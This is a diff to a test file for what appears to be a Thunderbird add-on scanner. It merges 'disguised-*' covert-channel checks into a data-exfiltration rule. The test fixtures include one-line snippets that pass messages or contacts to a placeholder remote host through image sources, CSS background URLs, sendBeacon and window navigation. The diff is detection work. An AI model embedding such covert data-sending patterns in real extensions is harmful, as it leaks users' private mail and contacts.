@@ -59,9 +59,6 @@ import { isEnglishLocale } from "../../src/lib/locales.js";
 import { offFormThunderbird } from "../../src/lib/trademark.js";
 import coreSymbolInWebext from "../../src/checks/rules/core-symbol-in-webext.js";
 import missingEnglish from "../../src/checks/rules/missing-english-localization.js";
-import disguisedResource from "../../src/checks/rules/disguised-resource.js";
-import disguisedStylesheet from "../../src/checks/rules/disguised-stylesheet.js";
-import disguisedTransmission from "../../src/checks/rules/disguised-transmission.js";
 import unparsableFile from "../../src/checks/rules/unparsable-file.js";
 import unanalysableFile from "../../src/checks/rules/unanalysable-file.js";
 import localeMessagesInvalid from "../../src/checks/rules/locale-messages-invalid.js";
@@ -1027,7 +1024,6 @@ test("every escalating check lands in the section its reader implies", async () 
       "build-lifecycle-hook",
       "data-exfiltration",
       "debugger-statement",
-      "disguised-transmission",
       "experiment-unknown-api",
       "minimize-web-accessible-resources",
       "missing-english-localization",
@@ -1097,11 +1093,6 @@ test("every check's severity is pinned to its band", async () => {
       "debugger-statement",
       "default-locale-missing",
       "default-locale-unused",
-      "disguised-navigation",
-      "disguised-resource",
-      "disguised-stylesheet",
-      "disguised-transmission",
-      "disguised-window",
       "eval-call",
       "experiment-manual-review",
       "experiment-missing-strict-max-version",
@@ -1223,17 +1214,12 @@ test("the checks that sweep their own blind spot are exactly these", async () =>
       // A check on a single-artifact route leaves the tree to that route - `null` here,
       // filled in by preSweepOf. A check on `input: all` names its own, and contributes
       // one of these per instruction it authors.
-      ["disguised-resource", "error", null],
-      ["disguised-stylesheet", "error", null],
-      ["disguised-window", "error", null],
-      ["disguised-navigation", "error", null],
       // The one sweeping check on `input: all`, so the one that names its own trees -
       // contributing two sweeps, one per tree, adjacent and XPI first.
       ["cleartext-transmission", "error", ARTIFACT_XPI],
       ["cleartext-transmission", "error", ARTIFACT_SCA],
       ["privacy-policy", "hold", null],
       ["data-exfiltration", "error", null],
-      ["disguised-transmission", "error", null],
       ["unacceptable-package-content", "error", null],
       ["shipped-icon-trademark-imitation", "error", null],
     ]
@@ -5781,52 +5767,12 @@ test("severity:auto fails safe to error when the check sets none/invalid", async
   );
 });
 
-// ---- disguised-transmission (covert) + data-exfiltration (overt) ----
-// Covert channels (data appended to an image/CSS/resource URL) are a flat
-// error; a normal fetch to a remote host escalates for an options-page consent
-// check. Local destinations and data-free covert loads are ignored.
-test("disguised-* hard-flag the STRONG covert case (a user-data API in the URL)", async () => {
-  const res = async (code) =>
-    (await disguisedResource.run(withManifest(jsCtx(code)))).findings.length;
-  const sty = async (code) =>
-    (await disguisedStylesheet.run(withManifest(jsCtx(code)))).findings.length;
-  // A user-data API call inside the covert URL -> provably user data -> hard error.
-  assert.equal(
-    await res('img.src = "https://x/?d=" + messenger.messages.list();'),
-    1
-  );
-  assert.equal(
-    await sty(
-      'el.style.backgroundImage = "url(https://x/?d=" + messenger.contacts.list() + ")";'
-    ),
-    1
-  );
-  // A merely-appended runtime value (no user-data API) is the WEAK case - NOT a
-  // hard finding here (it goes to disguised-transmission, asserted below).
-  assert.equal(await res('img.src = "https://x/?d=" + body;'), 0);
-  assert.equal(await res('img.src = "./logo.png";'), 0); // local
-  assert.equal(await res('img.src = "https://x/logo.png";'), 0); // static, no data
-});
-
-test("disguised-transmission escalates the WEAK covert case", async () => {
-  const cands = async (code) =>
-    (await disguisedTransmission.run(withManifest(jsCtx(code)))).escalations
-      .length;
-  assert.equal(await cands('img.src = "https://x/?d=" + body;'), 1); // appended-only
-  assert.equal(
-    await cands('window.location.href = "https://x/" + team + "/inbox";'),
-    1
-  ); // navigation, appended-only (the birdbox shape)
-  // The strong case stays with the hard disguised-* checks, not here.
-  assert.equal(
-    await cands('img.src = "https://x/?d=" + messenger.messages.list();'),
-    0
-  );
-  assert.equal(await cands('img.src = "https://x/logo.png";'), 0); // static, no data
-  assert.equal(await cands('fetch("https://x/?d=" + body);'), 0); // overt, not covert
-});
-
-test("data-exfiltration escalates an overt remote transmission only", async () => {
+// ---- data-exfiltration ----
+// Every route escalates: an overt transmission to a remote or dynamic host, and a URL
+// channel (resource, stylesheet, window, navigation) to a non-local host whose URL is
+// built with a runtime value or carries a user-data API call. A local destination and
+// a static URL send nothing of the user's, so they stay out.
+test("data-exfiltration escalates an overt remote transmission", async () => {
   const candidates = async (code) =>
     (await dataExfiltration.run(withManifest(jsCtx(code)))).escalations.length;
   assert.equal(
@@ -5835,7 +5781,40 @@ test("data-exfiltration escalates an overt remote transmission only", async () =
   );
   assert.equal(await candidates('navigator.sendBeacon("https://x", d);'), 1);
   assert.equal(await candidates('fetch("./local.json");'), 0); // local
-  assert.equal(await candidates('img.src = "https://x/?d=" + body;'), 0); // covert
+});
+
+test("data-exfiltration escalates a URL channel that may carry data", async () => {
+  const candidates = async (code) =>
+    (await dataExfiltration.run(withManifest(jsCtx(code)))).escalations.length;
+  // A user-data API call in the URL.
+  assert.equal(
+    await candidates('img.src = "https://x/?d=" + messenger.messages.list();'),
+    1
+  );
+  assert.equal(
+    await candidates(
+      'el.style.backgroundImage = "url(https://x/?d=" + messenger.contacts.list() + ")";'
+    ),
+    1
+  );
+  // A runtime value appended to the URL.
+  assert.equal(await candidates('img.src = "https://x/?d=" + body;'), 1);
+  assert.equal(
+    await candidates('window.location.href = "https://x/" + team + "/inbox";'),
+    1
+  );
+  assert.equal(await candidates('window.open("https://x/?q=" + term);'), 1);
+  // Nothing of the user's can leave.
+  assert.equal(await candidates('img.src = "./logo.png";'), 0); // local
+  assert.equal(await candidates('img.src = "https://x/logo.png";'), 0); // static
+});
+
+test("data-exfiltration labels a URL channel with its route", async () => {
+  const { escalations } = await dataExfiltration.run(
+    withManifest(jsCtx('window.open("https://x/?q=" + term);'))
+  );
+  assert.equal(escalations.length, 1);
+  assert.equal(escalations[0].hint, 'window.open() "https://x/?q=" + term');
 });
 
 // The transmission method and the destination AS WRITTEN ride on the escalation's
@@ -5933,7 +5912,7 @@ test("scanNetworkSinks carriesData follows aliases and captured namespaces", asy
 // ---- cleartext-transmission ----
 // Any overt transmission to a remote host over a non-TLS scheme is an error,
 // with or without a payload; encrypted (https/wss) and local destinations are
-// fine, and covert channels are disguised-transmission's job.
+// fine, and a URL channel is data-exfiltration's.
 test("cleartext-transmission flags overt http/ws/ftp remote sends only", async () => {
   // On `input: all`, so the body runs once per artifact this review has - one here.
   const run = async (code) =>
